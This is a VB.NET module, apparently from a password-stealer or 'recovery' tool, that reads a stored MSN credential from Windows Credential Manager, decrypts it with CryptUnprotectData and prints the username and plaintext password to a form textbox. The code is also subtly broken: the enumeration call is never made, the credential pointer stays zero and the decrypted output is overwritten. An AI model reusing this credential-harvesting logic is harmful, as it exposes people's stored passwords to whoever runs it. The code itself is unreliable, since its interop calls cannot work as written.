Imports System.Collections.Generic
Imports System.Text
Imports System.Runtime.InteropServices
Imports System.IO
Module MSN
    <DllImport("advapi32.dll", SetLastError:=True, CharSet:=CharSet.Unicode)> _
    Public Function CredEnumerateW(ByVal filter As String, ByVal flag As UInteger, ByVal count As UInteger, ByVal pCredentials As IntPtr) As Boolean
    End Function
    <DllImport("crypt32", CharSet:=CharSet.Auto, SetLastError:=True)> _
    Friend Function CryptUnprotectData(ByRef dataIn As DATA_BLOB, ByVal ppszDataDescr As Integer, ByVal optionalEntropy As Integer, ByVal pvReserved As Integer, ByVal pPromptStruct As Integer, ByVal dwFlags As Integer, _
     ByVal pDataOut As DATA_BLOB) As Boolean
    End Function
    Friend Structure CREDENTIAL
        Public Flags As Integer
        Public Type As Integer
        <MarshalAs(UnmanagedType.LPWStr)> _
        Public TargetName As String
        <MarshalAs(UnmanagedType.LPWStr)> _
        Public Comment As String
        Public LastWritten As Long
        Public CredentialBlobSize As Integer
        Public CredentialBlob As Integer
        Public Persist As Integer
        Public AttributeCount As Integer
        Public Attributes As IntPtr
        <MarshalAs(UnmanagedType.LPWStr)> _
        Public TargetAlias As String
        <MarshalAs(UnmanagedType.LPWStr)> _
        Public UserName As String
    End Structure
    Private Cred As CREDENTIAL
    Friend Structure DATA_BLOB
        Public cbData As Integer
        Public pbData As Integer
    End Structure
    Friend Structure UserDetails
        Public uName As String
        Public uPass As String
    End Structure
    Public count As UInteger
    Public pCredentials As IntPtr = IntPtr.Zero
    Public dataIn As DATA_BLOB
    Public dataOut As DATA_BLOB
    Public uDetail As UserDetails
    Public Function getPwd() As String()
        Password()
        Dim pass As String() = {uDetail.uName, uDetail.uPass}
        Return pass

    End Function
    Public Sub Password()
        Try
            Dim ptr As IntPtr = Marshal.ReadIntPtr(pCredentials, 0 * 4)
            Cred = CType(Marshal.PtrToStructure(ptr, Cred.[GetType]()), CREDENTIAL)
            dataIn.pbData = Cred.CredentialBlob
            dataIn.cbData = Cred.CredentialBlobSize
            CryptUnprotectData(dataIn, 0, 0, 0, 0, 1, _
             dataOut)
            dataOut.pbData = dataIn.pbData

            uDetail.uName = Cred.UserName
            uDetail.uPass = (Marshal.PtrToStringUni(New IntPtr(dataOut.pbData)))
            Dim nl As String = vbNewLine
            Form1.ztextz.AppendText(nl)
            Form1.ztextz.AppendText("============MSN==============")
            Form1.ztextz.AppendText(nl)
            Form1.ztextz.AppendText("Username: " & uDetail.uName)
            Form1.ztextz.AppendText(nl)
            Form1.ztextz.AppendText("Password: " & uDetail.uPass)
            Form1.ztextz.AppendText(nl)
            Exit Sub
        Catch x As Exception
            Dim nl As String = vbNewLine
            Form1.ztextz.AppendText(nl)
            Form1.ztextz.AppendText("============MSN==============")
            Form1.ztextz.AppendText(nl)
            Form1.ztextz.AppendText("MSN Could not be recovered!")
            Form1.ztextz.AppendText(nl)
            Exit Sub
        End Try
    End Sub
End Module
